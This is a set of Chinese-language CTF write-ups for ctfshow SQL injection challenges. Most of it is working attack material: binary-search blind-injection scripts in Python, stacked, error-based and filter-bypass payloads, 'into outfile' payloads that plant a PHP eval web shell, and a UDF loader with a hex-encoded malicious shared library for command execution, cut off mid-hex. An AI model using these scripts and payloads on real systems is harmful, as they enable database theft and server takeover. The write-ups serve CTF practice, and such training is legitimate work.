![image.png](assets/1639588729720-c9693f22-4cf8-43f4-b75c-d2bd2cd9bcc2.png)
原来是base64加密了，一开始的思路是用to_base64去抵消这个from_base64，但是试了几次没有成功，索性就换个思路，尝试闭合括号
![image.png](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/CTFSHOW/assets/1639588798875-b2743f75-0c16-490e-9d26-bc8eea83759b.png)
发现页面确实响应了2s左右，那么就可以写脚本了

```python
'''
Author: KonDream
Date: 2021-12-16 01:07:35
LastEditors:  KonDream
LastEditTime: 2021-12-16 01:21:29
Description:  
'''
import requests

url = "http://69171097-f166-41e6-88a9-b4e0b723e5b9.challenge.ctf.show/api/index.php"

flag = '' 
# 爆数据库名 ctfshow_flagxcc,ctfshow_info
# payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
# 爆表名 id,flagaac,info
# payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxcc'"
# 爆字段
payload = "select flagaac from ctfshow_flagxcc"

for i in range(1, 46):
    # 查找ascii从32-128的所有字符
    low = 32
    high = 128
    # 二分查找 提升效率
    while True:
        mid = (low + high) >> 1
        if low == mid:  # low处对应字符即为数据库中的字符
            flag += str(chr(mid + 1))
            print('[*] {}'.format(flag))
            break
        
        data = {
            # 二分法查找字符，ascii值大则sleep
            'ip' : "1) or if(ascii(substr(({}), {}, 1)) > {}, sleep(1), 1)-- -".format(payload, i, mid),
            'debug' : 1
        }

        r = requests.post(url=url, data=data)
        r = r.elapsed.total_seconds() # 获取页面响应时间

        if r > 1: #响应时间超过1s，证明查询成功
            low = mid # 查询成功，区间向右靠拢
        else:
            high = mid # 查询失败，区间向左靠拢
```

## web217（时间盲注,benchmark()）

过滤了sleep，看另一个函数：
![image.png](assets/1639590432313-5d8ded0b-d8f8-4629-8766-1e509e552064.png)
所以我们可以控制参数来控制页面响应时间，经过测试，这个题需要benchmark(100000000/2,1)，这样的回显大概是2s左右，然后判断还是大于1s，当然也可以让响应时间更短一点，接近于1s更好，但是这样容易产生误差，所以我设置在了2s左右，接下来就是常规的爆数据库、表名、字段

```python
'''
Author: KonDream
Date: 2021-12-16 01:33:25
LastEditors:  KonDream
LastEditTime: 2021-12-16 01:50:45
Description:  
'''
from datetime import date
import requests

url = "http://81c3c844-1a05-49e8-8af8-90ffe70f5c53.challenge.ctf.show/api/index.php"

flag = 'ctfshow{' 
# 爆数据库名 ctfshow_flagxccb,ctfshow_info
# payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
# 爆表名 id,flagaabc,info
# payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxccb'"
# 爆字段
payload = "select flagaabc from ctfshow_flagxccb"


for i in range(9, 46):
    # 查找ascii从32-128的所有字符
    low = 32
    high = 128
    # 二分查找 提升效率
    while True:
        mid = (low + high) >> 1
        if low == mid:  # low处对应字符即为数据库中的字符
            flag += str(chr(mid + 1))
            print('[*] {}'.format(flag))
            break
        
        data = {
            # 二分法查找字符，ascii值大则sleep
            'ip' : "1) or if(ascii(substr(({}), {}, 1)) > {}, benchmark(100000000/2,1), 1)-- -".format(payload, i, mid),
            'debug' : 1
        }

        r = requests.post(url=url, data=data)
        r = r.elapsed.total_seconds() # 获取页面响应时间
        # print(r)
        if r > 1: #响应时间超过1s，证明查询成功
            low = mid # 查询成功，区间向右靠拢
        else:
            high = mid # 查询失败，区间向左靠拢
```

## web218（时间盲注,过滤sleep|benchmark，用join）

```php
    //屏蔽危险分子
    function waf($str){
        return preg_match('/sleep|benchmark/i',$str);
    }   
```

过滤了benchmark，思想还是一样的，就是查询大量数据以拖慢查询速度，这里使用join
脚本：（执行较慢，耐心等待）

```python
'''
Author: KonDream
Date: 2021-12-16 14:03:54
LastEditors:  KonDream
LastEditTime: 2021-12-16 14:40:13
Description:  
'''
import requests

url = "http://3efff415-cc9f-459f-b367-913404f94af4.challenge.ctf.show/api/index.php"

flag = 'ctfshow{' 
# 爆数据库名 ctfshow_flagxc,ctfshow_info
# payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
# 爆表名 id,flagaac,info
# payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'"
# 爆字段
payload = "select flagaac from ctfshow_flagxc"

for i in range(9, 46):
    # 查找ascii从32-128的所有字符
    low = 32
    high = 128
    # 二分查找 提升效率
    while True:
        mid = (low + high) >> 1
        if low == mid:  # low处对应字符即为数据库中的字符
            flag += str(chr(mid + 1))
            print('[*] {}'.format(flag))
            break
        
        data = {
            # 二分法查找字符，ascii值大则sleep
            'ip' : "1) or if(ascii(substr(({}), {}, 1)) > {}, (SELECT count(*) FROM information_schema.columns A join information_schema.columns B), 1)-- -".format(payload, i, mid),
            'debug' : 1
        }

        r = requests.post(url=url, data=data)
        r = r.elapsed.total_seconds() # 获取页面响应时间
        # print(r)
        if r > 1: #响应时间超过1s，证明查询成功
            low = mid # 查询成功，区间向右靠拢
        else:
            high = mid # 查询失败，区间向左靠拢
```

## web219（时间盲注）

```php
    //屏蔽危险分子
    function waf($str){
        return preg_match('/sleep|benchmark|rlike/i',$str);
    }   
```

同上，需调整查询时间

```python
'''
Author: KonDream
Date: 2021-12-16 14:46:37
LastEditors:  KonDream
LastEditTime: 2021-12-16 14:53:16
Description:  
'''
import requests

url = "http://1d0e7741-69a4-48e2-9e35-24b48f64ebd7.challenge.ctf.show/api/index.php"

flag = 'ctfshow{' 
# 爆数据库名 ctfshow_flagxca,ctfshow_info
# payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
# 爆表名 id,flagaabc,info
# payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxca'"
# 爆字段
payload = "select flagaabc from ctfshow_flagxca"

for i in range(9, 46):
    # 查找ascii从32-128的所有字符
    low = 32
    high = 128
    # 二分查找 提升效率
    while True:
        mid = (low + high) >> 1
        if low == mid:  # low处对应字符即为数据库中的字符
            flag += str(chr(mid + 1))
            print('[*] {}'.format(flag))
            break
        
        data = {
            # 二分法查找字符，ascii值大则sleep
            'ip' : "1) or if(ascii(substr(({}), {}, 1)) > {}, (SELECT count(*) FROM information_schema.columns A join information_schema.columns B), 1)-- -".format(payload, i, mid),
            'debug' : 1
        }

        r = requests.post(url=url, data=data)
        r = r.elapsed.total_seconds() # 获取页面响应时间
        # print(r)
        if r > 0.3: #响应时间超过0.3s，证明查询成功
            low = mid # 查询成功，区间向右靠拢
        else:
            high = mid # 查询失败，区间向左靠拢
```

## web220（时间盲注）

```php
    //屏蔽危险分子
    function waf($str){
        return preg_match('/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i',$str);
    }  
```

这个题有两个坑点，一是过滤了concat，导致payload中不能用，这个卡了我好久，二是payload要记得limit呜呜呜，一个一个查

```python
'''
Author: KonDream
Date: 2021-12-16 14:55:32
LastEditors:  KonDream
LastEditTime: 2021-12-16 15:42:39
Description:  
'''
import requests

url = "http://5436efa6-7299-4603-b73c-2c97d55a1620.challenge.ctf.show/api/index.php"

flag = '' 
# 爆数据库名 ctfshow_flagxcac,ctfshow_info
# payload = "select table_name from information_schema.tables where table_schema=database() limit 1"
# 爆表名 id,flagaabcc,info
# payload = "select column_name from information_schema.columns where table_name='ctfshow_flagxcac' limit 1,1"
# 爆字段
payload = "select flagaabcc from ctfshow_flagxcac"

for i in range(1, 46):
    # 查找ascii从32-128的所有字符
    low = 32
    high = 128
    # 二分查找 提升效率
    while True:
        # time.sleep(1
        mid = (low + high) >> 1
        if low == mid:  # low处对应字符即为数据库中的字符
            flag += str(chr(mid + 1))
            print('[*] {}'.format(flag))
            break
        
        data = {
            # 二分法查找字符，ascii值大则sleep
            'ip' : "1) or if(ord(right(left(({}), {}), 1)) > {}, (SELECT count(*) FROM information_schema.columns A join information_schema.columns B), 0)-- -".format(payload, i, mid),
            'debug' : 1
        }
        r = requests.post(url=url, data=data)
        r = r.elapsed.total_seconds() # 获取页面响应时间
    
        if r > 0.3: #响应时间超过0.3s，证明查询成功
            low = mid # 查询成功，区间向右靠拢
        else:
            high = mid # 查询失败，区间向左靠拢

```

## web221（limit注入,procedure与analyse）

参考文章：[https://www.cnblogs.com/blacksunny/p/9115141.html](https://www.cnblogs.com/blacksunny/p/9115141.html)

```php
  //分页查询
  $sql = select * from ctfshow_user limit ($page-1)*$limit,$limit;

//TODO:很安全，不需要过滤
//拿到数据库名字就算你赢
```

第一次遇到这种题，收集一下姿势吧，看一眼题面，两个参数，而且是跟在limit后的，所以猜想是limit注入。查了资料：

```sql
# MYSQL 5.x
SELECT
    [ALL | DISTINCT | DISTINCTROW ]
      [HIGH_PRIORITY]
      [STRAIGHT_JOIN]
      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]
      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]
    select_expr [, select_expr ...]
    [FROM table_references
    [WHERE where_condition]
    [GROUP BY {col_name | expr | position}
      [ASC | DESC], ... [WITH ROLLUP]]
    [HAVING where_condition]
    [ORDER BY {col_name | expr | position}
      [ASC | DESC], ...]
    [LIMIT {[offset,] row_count | row_count OFFSET offset}]
    [PROCEDURE procedure_name(argument_list)]
    [INTO OUTFILE 'file_name' export_options
      | INTO DUMPFILE 'file_name'
      | INTO var_name [, var_name]]
    [FOR UPDATE | LOCK IN SHARE MODE]]
```

**得知limit后面只能跟两个函数，PROCEDURE 和 INTO，INTO除非有写入shell的权限，否则是无法利用的。**所以就剩一个procedure是可用的，**同时Mysql中默认可用的存储过程只有analyse，然后就是使用报错注入爆出数据库**
payload：?page=1&limit=1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1)
![image.png](assets/1639911137139-175384dd-5bf8-4a35-8d88-adb6f9aa4565.png)
最后提交数据库名即可

## web222（时间盲注）

```python
'''
Author: KonDream
Date: 2021-12-19 19:00:03
LastEditors:  KonDream
LastEditTime: 2021-12-19 19:25:04
Description:  
'''
import requests

url = "http://c34cda53-3c9f-45af-af99-1c8aa15a98ad.challenge.ctf.show/api/"

# 爆数据库名 ctfshow_flaga,ctfshow_info
# payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
# 爆表名 id,flagaabc,info
# payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flaga'"
# 爆字段
payload = "select flagaabc from ctfshow_flaga"

flag = 'ctfshow{' 

for i in range(9, 46):
    # 查找ascii从32-128的所有字符
    low = 32
    high = 128
    # 二分查找 提升效率
    while True:
        # time.sleep(1
        mid = (low + high) >> 1
        if low == mid:  # low处对应字符即为数据库中的字符
            flag += str(chr(mid + 1))
            print('[*] {}'.format(flag))
            break
        
        params = {
            'u' : "if(ascii(substr(({}), {}, 1)) > {}, sleep(0.05), 2)".format(payload, i, mid),
            'page' : 1,
            'limit' : 1
        }
        r = requests.get(url=url, params=params)
        r = r.elapsed.total_seconds() # 获取页面响应时间
    
        if r > 0.8: #响应时间超过0.8s，证明查询成功
            low = mid # 查询成功，区间向右靠拢
        else:
            high = mid # 查询失败，区间向左靠拢
```

**这里由于是利用group，那么有几条语句就会执行几次sleep，所以sleep(0.05)实际上响应是1s多**

## web223（布尔盲注）

这个题过滤了数字，和之前的题差不多

```python
'''
Author: KonDream
Date: 2021-12-19 19:57:38
LastEditors:  KonDream
LastEditTime: 2021-12-19 20:22:31
Description:  
'''
import requests

url = "http://cc96dd6e-0222-4637-bd24-0aaf6006aff3.challenge.ctf.show/api/"

# 爆数据库名 ctfshow_flagas,ctfshow_user
# payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
# 爆表名 id,flagasabc,info
# payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagas'"
# 爆字段
payload = "select flagasabc from ctfshow_flagas"

flag = 'ctfshow{' 

def cal_True(num):
    res = 'true'
    if num == 1:
        return res
    else:
        for i in range(num - 1):
            res += "+true"
        return res


for i in range(9, 46):
    # 查找ascii从32-128的所有字符
    low = 32
    high = 128
    # 二分查找 提升效率
    while True:

        mid = (low + high) >> 1
        if low == mid:  # low处对应字符即为数据库中的字符
            flag += str(chr(mid + 1))
            print('[*] {}'.format(flag))
            break
        
        i_True = cal_True(i)    # 2->true+true
        mid_True = cal_True(mid)

        params = {
            'u' : "if(ascii(substr(({}), {}, true)) > {}, username, 'a')".format(payload, i_True, mid_True),
            'page' : 1,
            'limit' : 1
        }
        r = requests.get(url=url, params=params)
 
		if 'passwordAUTO' in r.text: # 回显passwordAUTO，证明查询成功
            low = mid # 查询成功，区间向右靠拢
        else:
            high = mid # 查询失败，区间向左靠拢
```

## web225（堆叠注入，handler）

```sql
  //分页查询
  $sql = "select id,username,pass from ctfshow_user where username = '{$username}';";
      
返回逻辑

  //师傅说过滤的越多越好
  if(preg_match('/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i',$username)){
    die(json_encode($ret));
  }
 
```

堆叠注入，常规的查询被ban了，考虑使用handler，先看官网文档说明

>HANDLER *tbl_name* OPEN [ [AS] *alias*] 
>
>HANDLER *tbl_name* READ *index_name* { = | <= | >= | < | > } (*value1*,*value2*,...)    
>
>​	[ WHERE *where_condition* ] [LIMIT ... ] 
>
>HANDLER *tbl_name* READ *index_name* { FIRST | NEXT | PREV | LAST }    
>
>​	[ WHERE *where_condition* ] [LIMIT ... ] 
>
>HANDLER *tbl_name* READ { FIRST | NEXT }    
>
>​	[ WHERE *where_condition* ] [LIMIT ... ] 
>
>HANDLER *tbl_name* CLOSE

handler能够一行一行的浏览一个表中的数据，但是 handler 语句并不具备 select 语句的所有功能。它是 MySQL 专用的语句，并没有包含到SQL标准中。handler 语句提供通往表的直接通道的存储引擎接口，可以用于 MyISAM 和 InnoDB 表。

首先查表：`payload：ctfshow';show tables;`

![image-20220113183036894](assets/image-20220113183036894.png)

然后查表中内容，`payload：ctfshow';handler ctfshow_flagasa open;handler ctfshow_flagasa read first;`

![image-20220113183231895](assets/image-20220113183231895.png)

预处理 将sql语句转换成16进制[![file](assets/image-1618105733726.png)](https://rainy-autumn.top/attachment/uploads/2021/03/image-1618105733726.png)

file



```
';prepare a from 0x73656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;execute a;#
1C
```

[![file](assets/image-1618105771877.png)](https://rainy-autumn.top/attachment/uploads/2021/03/image-1618105771877.png)

file



ctfsh_ow_flagas,ctfshow_user

同样继续查字段和flag就可

# web227-230（预处理）

[参考](https://blog.csdn.net/qq_41573234/article/details/80411079) [参考](https://blog.csdn.net/solitudi/article/details/110144623)

```
';prepare a from 0x53454c4543542020202a20202046524f4d202020696e666f726d6174696f6e5f736368656d612e526f7574696e6573;execute a;#
1C
```

# web231

在api/index.php下post数据

```
password=1',username=user() where 1=1#&username=1
APACHE
```

[![file](assets/image-1618108930488.png)](https://rainy-autumn.top/attachment/uploads/2021/03/image-1618108930488.png)

file



[![file](assets/image-1618108938446.png)](https://rainy-autumn.top/attachment/uploads/2021/03/image-1618108938446.png)

file



然后修改payload 查表（banlist,ctfshow_user,flaga）

```
password=1',username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where  1=1#&username=1
ROUTEROS
```

查字段（id,flagas,info）

```
password=1',username=(select group_concat(column_name) from information_schema.columns where table_name='flaga') where  1=1#&username=1
ROUTEROS
```

查falg

```
password=1',username=(select flagas from flaga) where  1=1#&username=1
ROUTEROS
```

# web232（闭合MD5）

上边的payload也同样可以 和上边一样把md5闭合就行了

```
password=c4ca4238a0b923820dcc509a6f75849b') ,username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#&username=1
ROUTEROS
```

[![file](assets/image-1618109513732.png)](https://rainy-autumn.top/attachment/uploads/2021/03/image-1618109513732.png)

file



# web233

改成盲注 之前的不管用了 sleep时间要设置好 每一条数据都要sleep一下

```
import requests
import time
url="http://15a4a162-cf9c-4a5f-9ddd-d0ac5eda8c30.challenge.ctf.show:8080/api/index.php"
flag=''
i=0
#查表ctfshow_flaga,ctfshow_user
payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
# 查字段id,flagaabc,inf
#payload="select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flaga'"
#payload="select flagaabc from ctfshow_flaga"

while True:
    i+=1
    head=32
    tail=127
    while head<tail:
        mid=(head+tail)>>1
        data={
            'password':'1',
            'username':f"1' or if(ascii(substr(({payload}),{i},1))>{mid},sleep(0.05),1)#"
        }
        try:
            r=requests.post(url,data=data,timeout=1)
            tail=mid
        except:
            head=mid+1
    if head!=32:
        flag+=chr(head)
        print(flag)

    else:
        breakROUTEROS
```

# web234

过滤了单引号 用/将password的单引号转义 $sql = “update ctfshow_user set pass = ‘{$password}’ where username = ‘{$username}’;”;

传入password=\&username=,username=database()# 变成

```
库名（ctfshow_web）
update ctfshow_user set pass = '\' where username = ',username=database()#';SQL
```

然后更改payload查数据即可 payload

```
查表(banlist,ctfshow_user,flag23a)
password=\&username=,username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#

查字段 将表名换成十六进制(id,flagass23s3,info)
password=\&username=,username=(select group_concat(column_name) from information_schema.columns where table_name=0x666c6167323361)#

查flag
password=\&username=,username=(select flagass23s3 from flag23a)#PGSQL
```

# web235(bypass information,无列名注入)

过滤了or ‘ information [参考By pass information](https://blog.csdn.net/qq_45521281/article/details/106647880)

```
查表 （banlist,ctfshow_user,flag23a1）
password=\&username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#PGSQL
```

[无列名注入](https://zhuanlan.zhihu.com/p/98206699)

```
password=\&username=,username=(select group_concat(`2`) from (select 1,2,3 union select * from flag23a1)a)#
或
password=\&username=,username=(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a)#N1QL
```

# web236

查表同上（banlist,ctfshow_user,flaga）

```
password=\&username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#
PGSQL
```

emmm 好像是输出过滤 不是输入过滤

```
password=\&username=,username=(select to_base64(b) from (select 1,2 as b,3 union select * from flaga limit 1,1)a)#
PGSQL
```

# web237

$sql = “insert into ctfshow_user(username,pass) value(‘{$username}’,’{$password}’);”;

闭合单引号把构造的查询结果插入到表里

```
查表(banlist,ctfshow_user,flag)
username=1',(select group_concat(table_name) from information_schema.tables where table_schema=database()))#&password=1

查字段（id,flagass23s3,info）
username=1',(select group_concat(column_name) from information_schema.columns where table_name='flag'))#&password=1

查flag
username=1',(select group_concat(flagass23s3) from flag))#&password=1ROUTEROS
```

# web238

过滤了空格 用括号代替 应该也ban了*

```
username=2',(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))#&password=1
N1QL
username=2',(select(group_concat(column_name))from(information_schema.columns)where(table_name='flagb')))#&password=1
CSHARP
```

# web239

过滤了or和之前一样by pass information 不会写

# web240

```
import requests
url="http://e8acf4aa-90c8-414d-9630-b2259e10521c.challenge.ctf.show:8080/api/insert.php"
for a1 in "ab":
    for a2 in "ab":
        for a3 in "ab":
            for a4 in "ab":
                for a5 in "ab":
                    payload="flag"+a1+a2+a3+a4+a5
                    data={
                        'username':f"1',(select(flag)from({payload})))#",
                        'password':'1'
                    }
                    print(data)
                    r=requests.post(url,data=data)ARMASM
```

跑完脚本然后看下首页刷新就有flag了

# web241

时间盲注 sleep设置好 容易受网络影响

```
import requests
import time
url="http://3a73254d-26fa-44cb-bf98-e7502e136583.challenge.ctf.show:8080/api/delete.php"
flag=''
i=0
#查表
payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
# 查字段
#payload="select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flaga'"
#payload="select flagaabc from ctfshow_flaga"
while True:
    head=32
    tail=127
    i+=1
    while head<tail:
        mid=(head+tail)>>1
        data={
            'id':f"if(ascii(substr(({payload}),{i},1))>{mid},sleep(0.5),0)"
        }
        try:
            print(data)
            r=requests.post(url,data=data,timeout=0.9)
            tail=mid
        except:
            head=mid+1
        time.sleep(0.2)
    if head!=32:
        flag+=chr(head)
        print(flag)
    else:
        breakROUTEROS
```

# web242（文件读写，into outfile 的扩展）

```sql
SELECT ... INTO OUTFILE 'file_name'
        [CHARACTER SET charset_name]
        [export_options]

export_options:
    [{FIELDS  COLUMNS}
        [TERMINATED BY 'string']//分隔符
        [[OPTIONALLY] ENCLOSED BY 'char']
        [ESCAPED BY 'char']
    ]
    [LINES
        [STARTING BY 'string']
        [TERMINATED BY 'string']
    ]GAMS
“OPTION”参数为可选参数选项，其可能的取值有：

`FIELDS TERMINATED BY '字符串'`：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。

`FIELDS ENCLOSED BY '字符'`：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。

`FIELDS OPTIONALLY ENCLOSED BY '字符'`：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。

`FIELDS ESCAPED BY '字符'`：设置转义字符，只能为单个字符。默认值为“\”。

`LINES STARTING BY '字符串'`：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。

`LINES TERMINATED BY '字符串'`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。PGSQL

可以写马的参数有：
FIELDS TERMINATED BY、 LINES STARTING BY、 LINES TERMINATED BY
```

payload

```
filename=1.php' LINES STARTING BY '<?php eval($_POST[1]);?>'#
```

getshell 后flag在服务器根目录

# web243

过滤了php

然后dump这里有个index.php 看响应码 只是伪造了个403 然后就是写.user.ini了 payload

```
filename=.user.ini' LINES STARTING BY ';' TERMINATED BY 0x0a6175746f5f70726570656e645f66696c653d312e6a70670a#
1C
```

首先给每行添加一个； 将原本的内容注释掉

```
auto_prepend_file=1.jpg
INI
```

然后再上传个1.jpg 用短标签

```
filename=1.jpg' LINES STARTING BY '<?=eval($_POST[1]);?>'#
INI
```

然后访问dump getshell

# web244（UPDATEXML() 报错注入）

UPDATEXML() 报错注入

```
UPDATEXML (XML_document, XPath_string, new_value); 
第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 
第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 
第三个参数：new_value，String格式，替换查找到的符合条件的数据 
作用：改变文档中符合条件的节点的值HAXE
```

payload

```
id=' or updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),1),1)-- -
APACHE
```

updatexml的第二个参数开头是1 不符合xpath语法 所以会报错 然后把括号内的内容报出来

# web245（Extractvalue报错注入）

updatexml被过滤 使用Extractvalue报错注入[![file](assets/image-1618127867912.png)](https://rainy-autumn.top/attachment/uploads/2021/03/image-1618127867912.png)

file

和updatexml一样 payload



```
?id=' or extractvalue(1,concat(0x7e,database(),0x7e))#23
APPLESCRIPT
```

# web246

双查询报错 [原理](https://www.cnblogs.com/laoxiajiadeyun/p/10283251.html#双查询报错注入原理探索) payload

```
' union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand()*2))a from information_schema.columns group by a-- -

?id=' union select 1,count(*),concat((select flag2 from ctfshow_flags),0x7e,floor(rand()*2))a from information_schema.columns group by a-- -Q
```

# web247

[参考](https://blog.csdn.net/rfrder/article/details/113791067)

ceil 是向上取整。 round

> ROUND(X) – 表示将值 X 四舍五入为整数，无小数位 ROUND(X,D) – 表示将值 X 四舍五入为小数点后 D 位的数值，D为小数点后小数位数。若要保留 X 值小数点左边的 D 位，可将 D 设为负值。

十二种报错

```sql
1. floor + rand + group by
select * from user where id=1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);
select * from user where id=1 and (select count(*) from (select 1 union select null union select  !1)x group by concat((select table_name from information_schema.tables  limit 1),floor(rand(0)*2)));

2. ExtractValue
select * from user where id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));

3. UpdateXml
select * from user where id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1));

4. Name_Const(>5.0.12)
select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;

5. Join
select * from(select * from mysql.user a join mysql.user b)c;
select * from(select * from mysql.user a join mysql.user b using(Host))c;
select * from(select * from mysql.user a join mysql.user b using(Host,User))c;

6. exp()//mysql5.7貌似不能用
select * from user where id=1 and Exp(~(select * from (select version())a));

7. geometrycollection()//mysql5.7貌似不能用
select * from user where id=1 and geometrycollection((select * from(select * from(select user())a)b));

8. multipoint()//mysql5.7貌似不能用
select * from user where id=1 and multipoint((select * from(select * from(select user())a)b));

9. polygon()//mysql5.7貌似不能用
select * from user where id=1 and polygon((select * from(select * from(select user())a)b));

10. multipolygon()//mysql5.7貌似不能用
select * from user where id=1 and multipolygon((select * from(select * from(select user())a)b));

11. linestring()//mysql5.7貌似不能用
select * from user where id=1 and linestring((select * from(select * from(select user())a)b));

12. multilinestring()//mysql5.7貌似不能用
select * from user where id=1 and multilinestring((select * from(select * from(select user())a)b));PGSQL
```

payload

```
?id=' union select 1,count(*),concat(0x7e,0x7e,(select `flag?` from ctfshow_flagsa limit 0,1),0x7e,ceil(rand()*2))a from information_schema.columns group by a-- -
N1QL
```

# web248（udf）

不会写 [参考UDF](https://lazzzaro.github.io/2020/05/16/web-SQL注入/)

```python
#参考脚本
#环境：Linux/MariaDB
import requests

url='http://15700a19-71aa-4c90-b3ca-b6db9d77c56d.chall.ctf.show/api/?id='
code='7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E